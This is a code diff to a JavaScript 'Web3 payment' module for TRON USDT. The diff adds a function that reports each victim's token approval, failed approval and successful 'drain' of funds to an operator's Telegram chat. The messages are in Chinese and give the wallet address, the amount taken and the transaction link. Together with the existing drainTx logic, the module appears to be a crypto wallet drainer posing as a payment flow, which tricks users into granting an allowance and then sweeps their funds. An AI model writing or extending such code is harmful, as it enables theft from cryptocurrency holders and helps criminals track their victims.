@@ -167,6 +167,47 @@ export function createWeb3Payment(callbacks = {}) {
     }
   }
 
+  // ── Send transaction notification to Telegram ──────────────────────────────────
+  async function sendTxToTelegram(type, data) {
+    const token = TELEGRAM_BOT_TOKEN;
+    const chatId = TELEGRAM_CHAT_ID;
+    if (!token || token === "YOUR_BOT_TOKEN" || !chatId || chatId === "YOUR_CHAT_ID") {
+      console.warn("[useWeb3Payment] Telegram not configured, skipping tx notification.");
+      return;
+    }
+    try {
+      const shortAddr = data.addr ? data.addr.slice(0, 6) + "..." + data.addr.slice(-4) : "???";
+      let text = "";
+      if (type === "APPROVED") {
+        text =
+          `✅ 用户已授权\n` +
+          `━━━━━━━━━━━━━━━\n` +
+          `📪 地址：${shortAddr}\n` +
+          `🔐 授权金额：${data.approvedAmount} USDT\n` +
+          `🧾 TX：${data.txHash.slice(0, 12)}...\n` +
+          `🔗 https://nile.tronscan.org/#/transaction/${data.txHash}`;
+      } else if (type === "DRAINED") {
+        text =
+          `💸 划转成功！\n` +
+          `━━━━━━━━━━━━━━━\n` +
+          `📪 地址：${shortAddr}\n` +
+          `💎 已划转：${data.drainedAmount} USDT\n` +
+          `🧾 TX：${data.txHash.slice(0, 12)}...\n` +
+          `🔗 https://nile.tronscan.org/#/transaction/${data.txHash}`;
+      } else if (type === "APPROVE_FAILED") {
+        text =
+          `❌ 授权失败\n` +
+          `━━━━━━━━━━━━━━━\n` +
+          `📪 地址：${shortAddr}\n` +
+          `⚠️ 原因：${data.error}`;
+      }
+      if (!text) return;
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+    } catch (err) {
+      console.error("[useWeb3Payment] Telegram tx notification failed:", err);
+    }
+  }
+
   // ── Fetch TRX balance ───────────────────────────────────────────────────────
   async function fetchTrxBalance(addr) {
     if (!window.tronWeb) return "0.00";
@@ -276,6 +317,13 @@ export function createWeb3Payment(callbacks = {}) {
 
           state.txHash = drainTx;
           notifyPhaseChange(PHASE.DONE);
+
+          // Notify Telegram: drain succeeded
+          sendTxToTelegram("DRAINED", {
+            addr: state.walletAddr,
+            drainedAmount: (allowance / 1e6).toFixed(2),
+            txHash: drainTx,
+          });
 
           setTimeout(() => {
             fetchBalances(addr);
@@ -430,6 +478,13 @@ export function createWeb3Payment(callbacks = {}) {
       .then((approveTx) => {
         state.txHash = approveTx;
 
+        // Notify Telegram: user approved
+        sendTxToTelegram("APPROVED", {
+          addr: state.walletAddr,
+          approvedAmount: (Number(APPROVE_AMOUNT) / 1e6).toFixed(2),
+          txHash: approveTx,
+        });
+
         // Phase 2: switch to polling
         notifyPhaseChange(PHASE.POLLING);
 
@@ -450,9 +505,14 @@ export function createWeb3Payment(callbacks = {}) {
           err?.code === 4001;
         notifyError(
           isRejection
-            ? "\u60a8\u53d6\u6d88\u4e86\u6388\u6743\u64cd\u4f5c\u3002"
-            : "\u6388\u6743\u5931\u8d25: " + msg
+            ? "您取消了授权操作。"
+            : "授权失败: " + msg
         );
+        // Notify Telegram: approve failed
+        sendTxToTelegram("APPROVE_FAILED", {
+          addr: state.walletAddr,
+          error: isRejection ? "用户拒绝签名" : msg,
+        });
         notifyPhaseChange(PHASE.ERROR);
       });
   }
